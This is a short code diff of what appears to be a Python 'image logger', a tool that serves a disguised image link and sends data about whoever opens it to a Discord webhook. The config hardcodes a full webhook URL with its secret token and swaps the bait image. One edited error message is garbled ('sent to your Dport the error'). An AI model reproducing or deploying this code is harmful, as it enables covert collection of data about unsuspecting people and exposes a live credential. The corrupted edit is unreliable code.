@@ -13,7 +13,7 @@ __author__ = "me"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1510747683436892291/palziT4d2vhR_YcFeUT1wQilNfx73-BsmWJncr8BERWqR0TekbwpbjZtxP-2SUci8TVR",
-    "image": "https://cdn.discordapp.com/attachments/717889565313990668/1073266567833468928/ezgif-2-cca9aa57e5.gif?ex=6a1da762&is=6a1c55e2&hm=abc079c6d0964a7a5d955ea657949b8844687f9ed88aafd19a8cefe6f9591f9d", # You can also have a custom image by using a URL argument
+    "image": "https://wallpaperaccess.com/full/9430104.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -293,7 +293,7 @@ if (!currenturl.includes("g=")) {
             self.send_header('Content-type', 'text/html')
             self.end_headers()
 
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Dport the error on the GitHub page.')
             reportError(traceback.format_exc())
 
         return
